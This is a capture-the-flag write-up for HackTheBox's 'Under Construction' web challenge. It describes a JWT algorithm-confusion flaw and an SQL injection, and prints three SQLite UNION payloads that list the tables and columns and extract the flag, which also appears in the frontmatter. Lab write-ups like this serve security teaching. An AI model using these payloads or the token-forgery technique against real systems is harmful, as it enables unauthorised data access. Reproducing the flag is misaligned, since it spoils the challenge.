---
title: Under Construction
description: Under Construction box from HackTheBox write up.
password: 'HTB{d0n7_3xp053_y0ur_publ1ck3y}'
---

# Under Construction <a href='/assets/resources/HackTheBox/UnderConstruction-resources.zip' title="Download resources"> :material-folder-zip:{:alt="Download resources"} </a>

## Static analysis

The challenge gives the webpage files so i started checking the code. In the `ìndex.js` file we can see the diferent paths we have: `/`, `/auth` and `/logout`. Everything looks right here so the next thing we can check is the `AuthMiddleware` that is what make sure if a user is logged in and who the user is.

The middleware is checking the cookies for a JWT token that will be decoded using the `JWTHelper` and if the token is right, the application will take the user name from the decoded token and check it in the database using the `DBHelper`. If the user exists the application sends the user to the index and if not it sends an error message. If the the token is incorrect or missing, the application responds with an error or redirecting to the login page respectively.

Let's talk about the helpers. Look's like the `JWTHelper` just contains functions to sign and verify/decode JWT tokens, the thing is that in the `decode` function the application is allowing the `HS256`, a symmetric algorithm, to verify the JWT. This means that we can sign tokens using the public key if we specify `HS256` as the algorithm (**JWT confusion attack**). About the `DBHelper`, it is mostly ok but for the `getUser` function because it is vulnerable to SQL injection. This function is called with the username contained in the JWT token to check if the user exists so we can enumerate the database.

## Attack

I wrote a Python script that generate the JWTs with a SQL injection payload, sends the tokens and parse the responses to make my life easier. We also know that the databse is SQLite (We know what payloads to use).

First to get the tables we can use:
```sqlite
' OR 1=2 UNION SELECT 1, group_concat(tbl_name), 3 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- -

Result --> flag_storage,users

```

Cool the `flag_storage` table looks promising let's enumerate it:

```sqlite
' OR 1=2 UNION select 1,group_concat(name),3 from pragma_table_info('flag_storage') -- -

Result --> id,top_secret_flaag
```

Now we can just get the flag with:

```sqlite
' OR 1=2 UNION select 1,group_concat(top_secret_flaag),3 from flag_storage -- -
```

